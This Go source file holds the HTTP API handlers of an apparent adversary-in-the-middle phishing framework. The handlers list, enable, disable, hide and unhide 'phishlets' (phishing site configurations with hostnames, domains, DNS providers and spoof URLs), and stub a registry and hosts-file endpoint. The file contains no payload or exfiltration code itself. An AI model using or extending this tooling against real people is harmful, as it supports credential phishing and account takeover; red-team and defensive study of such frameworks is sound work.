package api

import (
	"encoding/json"
	"errors"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

func (r *Router) listPhishlets(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)

	deployments, err := r.phishlets.ListDeployments()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to list phishlets")
		return
	}

	total := len(deployments)
	start := min(offset, total)
	end := min(start+limit, total)
	page := deployments[start:end]

	items := make([]sdk.PhishletResponse, len(page))
	for i, deployment := range page {
		items[i] = phishletDeploymentToResponse(deployment)
	}
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.PhishletResponse]{
		Items:  items,
		Total:  total,
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) enablePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")

	var body sdk.EnablePhishletRequest
	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
		writeError(w, http.StatusUnprocessableEntity, "invalid request body")
		return
	}

	deployment, err := r.phishlets.Enable(name, body.Hostname, body.BaseDomain, body.DNSProvider)
	if err != nil {
		if err.Error() == "hostname: required" {
			writeError(w, http.StatusUnprocessableEntity, err.Error())
		} else {
			writeError(w, http.StatusInternalServerError, "failed to enable phishlet")
		}
		return
	}
	writeJSON(w, http.StatusOK, phishletDeploymentToResponse(deployment))
}

func (r *Router) disablePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")
	deployment, err := r.phishlets.Disable(name)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to disable phishlet")
		}
		return
	}
	writeJSON(w, http.StatusOK, phishletDeploymentToResponse(deployment))
}

func (r *Router) hidePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")
	deployment, err := r.phishlets.Hide(name)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to hide phishlet")
		}
		return
	}
	writeJSON(w, http.StatusOK, phishletDeploymentToResponse(deployment))
}

func (r *Router) unhidePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")
	deployment, err := r.phishlets.Unhide(name)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to unhide phishlet")
		}
		return
	}
	writeJSON(w, http.StatusOK, phishletDeploymentToResponse(deployment))
}

// listRegistry stubs the phishlet registry — not implemented until Phase 15.
func (r *Router) listRegistry(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.PhishletResponse]{
		Items:  []sdk.PhishletResponse{},
		Total:  0,
		Limit:  limit,
		Offset: offset,
	})
}

// getPhishletHosts returns /etc/hosts lines for a phishlet. Stubbed until
// the PhishletResolver is wired into the Router.
func (r *Router) getPhishletHosts(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
}

func phishletDeploymentToResponse(deployment *aitm.PhishletDeployment) sdk.PhishletResponse {
	return sdk.PhishletResponse{
		Name:        deployment.Name,
		BaseDomain:  deployment.BaseDomain,
		Hostname:    deployment.Hostname,
		DNSProvider: deployment.DNSProvider,
		UnauthURL:   deployment.UnauthURL,
		SpoofURL:    deployment.SpoofURL,
		Enabled:     deployment.Enabled,
		Hidden:      deployment.Hidden,
	}
}
